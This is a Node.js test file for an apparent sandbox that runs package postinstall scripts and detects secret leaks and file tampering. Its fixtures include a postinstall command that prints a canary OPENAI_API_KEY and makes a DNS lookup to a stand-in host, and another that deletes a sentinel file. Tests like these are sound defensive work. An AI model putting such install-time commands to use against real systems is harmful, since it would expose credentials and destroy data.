import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { mkdtemp, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { probeRuntimeSandbox, runRuntimeAnalysis, runRuntimeScenario } from '../src/runtime/sandbox.mjs';

function candidate(command) {
  return {
    kind: 'package-script',
    packagePath: 'package.json',
    name: 'postinstall',
    command,
    workingDirectory: '.'
  };
}

test('scenario executor rejects caller-provided arbitrary environment values before execution', async () => {
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-experiment-invalid-env-'));
  await writeFile(path.join(root, 'package.json'), '{}');
  await assert.rejects(() => runRuntimeScenario({
    root,
    candidate: candidate('node -e "process.exit(0)"'),
    scenario: {
      templateId: 'secret-egress-canary-v1',
      envKeys: ['OPENAI_API_KEY'],
      env: { OPENAI_API_KEY: 'real-secret' },
      sentinelPaths: []
    },
    canarySeed: 'seed'
  }), /arbitrary environment values/i);
});

test('scenario executor rejects sentinel traversal before execution', async () => {
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-experiment-invalid-sentinel-'));
  await writeFile(path.join(root, 'package.json'), '{}');
  await assert.rejects(() => runRuntimeScenario({
    root,
    candidate: candidate('node -e "process.exit(0)"'),
    scenario: {
      templateId: 'filesystem-sentinel-v1',
      envKeys: [],
      sentinelPaths: ['../escape']
    },
    canarySeed: 'seed'
  }), /sentinel/i);
});

test('runtime scenario generates synthetic canaries internally and never returns their raw values', async (t) => {
  const probe = await probeRuntimeSandbox();
  if (probe.status !== 'ready') return t.skip(`sandbox unavailable: ${probe.reason}`);
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-experiment-canary-'));
  await writeFile(path.join(root, 'package.json'), '{}');
  const result = await runRuntimeScenario({
    root,
    candidate: candidate(`node -e "console.log(process.env.OPENAI_API_KEY); require('dns').lookup('example.invalid',()=>{})"`),
    scenario: {
      templateId: 'secret-egress-canary-v1',
      envKeys: ['OPENAI_API_KEY'],
      sentinelPaths: []
    },
    canarySeed: 'deterministic-test-seed',
    timeoutMs: 3_000
  });
  assert.equal(result.status === 'completed' || result.status === 'failed', true);
  assert.equal(result.canaryFingerprints.length, 1);
  assert.equal(result.canaryFingerprints[0].key, 'OPENAI_API_KEY');
  assert.match(result.canaryFingerprints[0].fingerprint, /^[a-f0-9]{64}$/);
  assert.equal(JSON.stringify(result).includes('rtx_'), false);
  assert.equal(result.run.events.some((event) => event.kind === 'dns'), true);
});

test('filesystem scenario seeds only fixed sandbox-local sentinel paths', async (t) => {
  const probe = await probeRuntimeSandbox();
  if (probe.status !== 'ready') return t.skip(`sandbox unavailable: ${probe.reason}`);
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-experiment-sentinel-'));
  await writeFile(path.join(root, 'package.json'), '{}');
  const sentinel = '.repotrial-experiment/sentinel-a.txt';
  const result = await runRuntimeScenario({
    root,
    candidate: candidate(`node -e "require('fs').unlinkSync(${JSON.stringify(sentinel)})"`),
    scenario: {
      templateId: 'filesystem-sentinel-v1',
      envKeys: [],
      sentinelPaths: [sentinel]
    },
    canarySeed: 'seed',
    timeoutMs: 3_000
  });
  assert.equal(result.sentinelPaths.every((item) => item.startsWith('.repotrial-experiment/')), true);
  assert.equal(result.run.filesystemChanges.some((item) => item.path === sentinel && item.change === 'deleted'), true);
});

test('legacy runtime off contract remains unchanged by scenario support', async () => {
  const result = await runRuntimeAnalysis({ mode: 'off' });
  assert.deepEqual(result, {
    schemaVersion: 'repotrial.runtime.v1',
    status: 'disabled',
    provider: null,
    reason: 'runtime-disabled',
    candidates: [],
    runs: [],
    truncatedCandidates: 0
  });
});
